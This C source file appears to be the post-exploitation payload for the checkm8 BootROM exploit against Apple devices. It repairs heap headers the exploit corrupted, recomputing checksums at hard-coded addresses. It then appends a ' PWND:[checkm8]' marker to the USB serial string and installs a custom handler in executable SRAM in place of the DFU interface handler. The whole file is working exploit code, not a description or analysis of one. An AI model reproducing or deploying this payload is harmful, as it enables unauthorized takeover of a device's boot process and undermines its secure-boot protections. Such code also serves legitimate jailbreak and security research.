#include "bootrom_func.h"
#include "dev_globals.h"

GLOBAL_STR(pwnd_str, " PWND:[checkm8]");

GLOBAL_PTR(addr_hs_desc, ADDR_HS_DESC)
GLOBAL_PTR(addr_fs_desc, ADDR_FS_DESC)
GLOBAL_PTR(addr_usb_serial, ADDR_USB_SERIAL)
GLOBAL_PTR(addr_dfu_intf_handle, ADDR_DFU_INTF_HANDLE)
GLOBAL_CHAR(cont, 1)

struct bleh
{
    int foo;
    char bar;
};

PAYLOAD_SECTION
void fix_heap()
{
    struct heap_header *broken = (struct heap_header *) 0x1801B9200;
    broken->curr_size = 4;
    broken->curr_free = 0;
    broken->prev_size = 2;
    broken->prev_free = 0;

    calc_chksum(&broken->chksum, &broken->curr_size, 32, (void *) ADDR_HEAP_COOKIE);

    struct heap_header *next = (struct heap_header *) 0x1801B9300;
    next->prev_size = 4;
    calc_chksum(&next->chksum, &next->curr_size, 32, (void *) ADDR_HEAP_COOKIE);
}

PAYLOAD_SECTION
void patch_serial()
{
    int len, base;
    char *serial = GET_GLOBAL(addr_usb_serial);
    char *patch = GET_PTR_TO_GLOBAL(pwnd_str);

    base = dev_strlen(serial);
    len = dev_strlen(patch);

    dev_memcpy(serial + base, patch, len);
    *((uint8_t *) ADDR_CORE_DESC_SERIAL) =
            usb_create_descriptor(serial);
}

PAYLOAD_SECTION
void copy_handler(uint32_t offset, uint32_t len)
{
    uint8_t *base;
    uint8_t *target = dev_malloc(len);

    __asm__ volatile ("adr %0, _start" : "=r" (base));
    dev_memcpy(target, base + offset, len);

    *((void **) GET_GLOBAL(addr_dfu_intf_handle)) = EXECUTABLE_SRAM(target);
}

PAYLOAD_SECTION
void run(uint64_t handler_data)
{
    fix_heap();
    check_all_chksums();
    patch_serial();

    uint32_t handler_offset = handler_data & 0xFFFFFFFF;
    uint32_t handler_len = (handler_data >> 32u) & 0xFFFFFFFF;
    copy_handler(handler_offset, handler_len);
}

void _start(uint64_t handler_data)
{
    run(handler_data);
}